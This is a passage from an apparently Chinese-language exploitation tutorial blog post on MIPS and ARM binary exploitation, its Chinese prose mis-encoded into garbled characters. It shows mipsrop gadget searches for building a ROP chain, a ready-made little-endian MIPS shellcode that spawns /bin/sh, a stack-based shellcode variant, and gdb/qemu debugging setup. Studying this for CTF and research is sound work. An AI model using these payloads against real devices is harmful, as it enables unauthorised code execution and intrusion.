<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-gadget2"   >
          <a href="#2-gadget2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gadget2" class="headerlink" title="(2)gadget2"></a>(2)gadget2</h4>
      <p>ä»æ ˆå–åœ°å€ç»™å¯„å­˜å™¨ï¼Œç„¶åè·³è½¬ä¹‹å‰æ§åˆ¶ä½çš„å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu a1,0x18(sp);move t9,s3;jalr t9</span><br></pre></td></tr></table></div></figure>

<p>addiuæŒ‡ä»¤å³æ˜¯å–æ ˆåœ°å€åˆ°a1å¯„å­˜å™¨ï¼Œæ–¹ä¾¿ä¹‹åè·³è½¬ï¼Œå¦‚ä¸‹å¯»æ‰¾æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-gadget3"   >
          <a href="#3-gadget3" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-gadget3" class="headerlink" title="(3)gadget3"></a>(3)gadget3</h4>
      <p>è·³è½¬ä¿å­˜æ ˆåœ°å€çš„å¯„å­˜å™¨ï¼Œè¿›å…¥<code>shellcode</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move t9,a1;move a1,a2;jr t9</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å¯»å€æŒ‡ä»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å› ä¸ºä¸€èˆ¬ä¸ŠåŸºæœ¬ä¸å­˜åœ¨ç›´æ¥å–æ ˆåœ°å€ç„¶åè·³è½¬çš„ï¼Œæ‰€ä»¥éœ€è¦å¤šé‡è·³è½¬æ¥å®Œæˆã€‚</p>

        <h2 id="ğŸ”ºå¯ç”¨shellcode"   >
          <a href="#ğŸ”ºå¯ç”¨shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå¯ç”¨shellcode" class="headerlink" title="ğŸ”ºå¯ç”¨shellcode:"></a>ğŸ”ºå¯ç”¨shellcode:</h2>
      
        <h3 id="1-ç›´æ¥å¯ç”¨çš„"   >
          <a href="#1-ç›´æ¥å¯ç”¨çš„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç›´æ¥å¯ç”¨çš„" class="headerlink" title="(1)ç›´æ¥å¯ç”¨çš„"></a>(1)ç›´æ¥å¯ç”¨çš„</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962         ib</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f    ib//</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)      </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873         hs</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e    hs/n</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc   //bin/sh</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu $v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"   >
          <a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="headerlink" title="(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"></a>(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x0c\x01\x01\x01&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”çš„å¦‚ä¸‹æ±‡ç¼–ä»£ç ï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw a0,-0x1e4(sp)&quot;</span> 	<span class="comment">#a</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a1,s2&quot;</span>			<span class="comment">#a1</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a2,s2&quot;</span>			<span class="comment">#a2</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw v0,-0x1d8(sp)&quot;</span>	<span class="comment">#v0</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;syscall&quot;</span>			<span class="comment">#syscall</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-è°ƒè¯•"   >
          <a href="#6-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-è°ƒè¯•" class="headerlink" title="6.è°ƒè¯•"></a>6.è°ƒè¯•</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./Mplogin</span><br><span class="line">target remote 127.0.0.1:12345</span><br></pre></td></tr></table></div></figure>








        <h1 id="ä¸‹è½½åº“"   >
          <a href="#ä¸‹è½½åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‹è½½åº“" class="headerlink" title="ä¸‹è½½åº“"></a>ä¸‹è½½åº“</h1>
      <p>å¼‚æ„ä¸‹è½½åº“</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install crossbuild-essential-*</span><br><span class="line">apt install qemu-user</span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/">http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E5%BC%82%E6%9E%84/">å¼‚æ„</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/11/02/%E6%B1%87%E7%BC%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">æ±‡ç¼–åŸºç¡€</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9BWP/"><span class="paginator-prev__text">å¼ºç½‘å†³èµ›æ‹Ÿæ€WP</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="toc-text">
          ä¸€ã€è°ƒè¯•é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ARM%E6%9E%B6%E6%9E%84"><span class="toc-text">
          1.ARMæ¶æ„</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0PIE"><span class="toc-text">
          (1)æ— PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89PIE"><span class="toc-text">
          (2)æœ‰PIE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-MIPS%E6%9E%B6%E6%9E%84"><span class="toc-text">
          2.MIPSæ¶æ„</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0PIE-1"><span class="toc-text">
          (1)æ— PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89PIE-1"><span class="toc-text">
          (2)æœ‰PIE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="toc-text">
          é¡¹ç›®ï¼š</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ARM"><span class="toc-text">
          äºŒã€ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8%E5%85%B3%E7%B3%BB"><span class="toc-text">
          1.å¯„å­˜å™¨å…³ç³»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-text">
          2.æ±‡ç¼–æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%A0%E9%80%81MOV"><span class="toc-text">
          (1)å¯„å­˜å™¨ä¼ é€MOV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%84%E5%AD%98%E5%99%A8-%E5%86%85%E5%AD%98%E4%BC%A0%E9%80%81"><span class="toc-text">
          (2)å¯„å­˜å™¨-å†…å­˜ä¼ é€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0STR-LDR%E6%A8%A1%E5%BC%8F"><span class="toc-text">
          â‘ STR&#x2F;LDRæ¨¡å¼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#STR-Ra-Rb-%EF%BC%9A"><span class="toc-text">
          STR Ra [Rb]ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LDR-Ra-Rb"><span class="toc-text">
          LDR Ra [Rb]</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1STM-LDM%E6%A8%A1%E5%BC%8F"><span class="toc-text">
          â‘¡STM&#x2F;LDMæ¨¡å¼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#STM-R0-R4-R5"><span class="toc-text">
          STM R0, {R4,R5}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (3)è·³è½¬æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC-Branch"><span class="toc-text">
          â‘ åˆ†æ”¯è·³è½¬(Branch)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#B"><span class="toc-text">
          B</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BX-lt-Rm-gt"><span class="toc-text">
          BX &lt;Rm&gt;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BL"><span class="toc-text">
          BL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BLX-BLR"><span class="toc-text">
          BLX&#x2F;BLR</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-text">
          â‘¡æ¡ä»¶è·³è½¬</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">
          2.éå¶å­å‡½æ•°æº¢å‡º</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%88%E6%A8%A1%E5%9E%8B"><span class="toc-text">
          (1)æ ˆæ¨¡å‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-text">
          (2)é¢˜ç›®ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">
          (3)åˆ©ç”¨ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A-%E5%90%8E%E9%97%A8"><span class="toc-text">
          A.åé—¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-ROP%E9%93%BE%E6%9D%A1"><span class="toc-text">
          B.ROPé“¾æ¡</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-text">
          ğŸ”ºæ³¨æ„ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%A0%88%E6%A8%A1%E5%9E%8B%EF%BC%9A"><span class="toc-text">
          åŠ«æŒæ ˆæ¨¡å‹ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E6%BA%A2%E5%87%BA%E5%AD%97%E8%8A%82%E4%B8%8D%E5%8F%97%E9%99%90%E5%88%B6"><span class="toc-text">
          A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#a-%E5%AD%98%E5%9C%A8pop-r0-pc"><span class="toc-text">
          a.å­˜åœ¨pop {r0,*, pc}</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#b-%E5%88%A9%E7%94%A8csu"><span class="toc-text">
          b.åˆ©ç”¨csu</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%BA%A2%E5%87%BA%E5%AD%97%E8%8A%82%E5%8F%97%E5%88%B0%E9%99%90%E5%88%B6"><span class="toc-text">
          B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#a-%E5%88%A9%E7%94%A8read%E5%87%BD%E6%95%B0-shellcode"><span class="toc-text">
          a.åˆ©ç”¨readå‡½æ•°+shellcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%BA%E5%AD%98%E5%9C%A8PIE%E6%97%B6"><span class="toc-text">
          ğŸ”ºå­˜åœ¨PIEæ—¶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">
          3.å¶å­å‡½æ•°æº¢å‡º</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%88%E6%A8%A1%E5%9E%8B-1"><span class="toc-text">
          (1)æ ˆæ¨¡å‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%EF%BC%9A-1"><span class="toc-text">
          (2)é¢˜ç›®ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%EF%BC%9A-1"><span class="toc-text">
          (3)åˆ©ç”¨ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          æ³¨ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">
          4.æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%A0%86"><span class="toc-text">
          5.å †</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode"><span class="toc-text">
          Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81MIPS"><span class="toc-text">
          ä¸‰ã€MIPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%89%B9%E7%82%B9"><span class="toc-text">
          1.æµæ°´çº¿ç‰¹ç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A%E6%B5%81%E6%B0%B4%E7%BA%BF"><span class="toc-text">
          ğŸ”ºæ³¨ï¼šæµæ°´çº¿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%88%E6%9C%BA%E5%88%B6"><span class="toc-text">
          2.æ ˆæœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-text">
          å‡½æ•°è°ƒç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%A0%88%E5%8A%A0%E8%BD%BD"><span class="toc-text">
          å‡½æ•°æ ˆåŠ è½½</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">
          å¶å­å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">
          éå¶å­å‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E"><span class="toc-text">
          å‡½æ•°è¿”å›</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0-1"><span class="toc-text">
          å¶å­å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0-1"><span class="toc-text">
          éå¶å­å‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          æ€»ç»“ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AF%84%E5%AD%98%E5%99%A8%E5%85%B3%E7%B3%BB"><span class="toc-text">
          3.å¯„å­˜å™¨å…³ç³»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8C%87%E4%BB%A4"><span class="toc-text">
          4.æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (1)ä¸åŒç±»å‹çš„æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E6%93%8D%E4%BD%9C%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">
          Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#I%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E6%93%8D%E4%BD%9C%E5%B8%B8%E9%87%8F"><span class="toc-text">
          Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J%E5%9E%8B%E6%8C%87%E4%BB%A4%EF%BC%9A%E8%B7%B3%E8%B7%83%E5%AF%BB%E5%9D%80"><span class="toc-text">
          Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">
          (2)å¸¸ç”¨æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0load-store-%E6%8C%87%E4%BB%A4"><span class="toc-text">
          â‘ load&#x2F;store æŒ‡ä»¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%AE%97%E6%95%B0%E6%8C%87%E4%BB%A4"><span class="toc-text">
          â‘¡ç®—æ•°æŒ‡ä»¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2syscall"><span class="toc-text">
          â‘¢syscall</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-text">
          â‘¤è·³è½¬æŒ‡ä»¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E5%AD%90%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">
          â‘¥å­å‡½æ•°çš„è°ƒç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A6%E5%AD%90%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E"><span class="toc-text">
          â‘¦å­å‡½æ•°çš„è¿”å›</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8ROP%E5%AF%BB%E5%9D%80"><span class="toc-text">
          5.å¸¸ç”¨ROPå¯»å€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E4%B8%89%E9%83%A8%E6%9B%B2"><span class="toc-text">
          Shellcodeä¸‰éƒ¨æ›²</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-gadget1"><span class="toc-text">
          (1)gadget1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-gadget2"><span class="toc-text">
          (2)gadget2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-gadget3"><span class="toc-text">
          (3)gadget3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E5%8F%AF%E7%94%A8shellcode"><span class="toc-text">
          ğŸ”ºå¯ç”¨shellcode:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%8F%AF%E7%94%A8%E7%9A%84"><span class="toc-text">
          (1)ç›´æ¥å¯ç”¨çš„</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%8E%E6%A0%88%E4%B8%8A%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%EF%BC%9A"><span class="toc-text">
          (2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%B0%83%E8%AF%95"><span class="toc-text">
          6.è°ƒè¯•</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%BA%93"><span class="toc-text">
          ä¸‹è½½åº“</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">133</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">83</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';
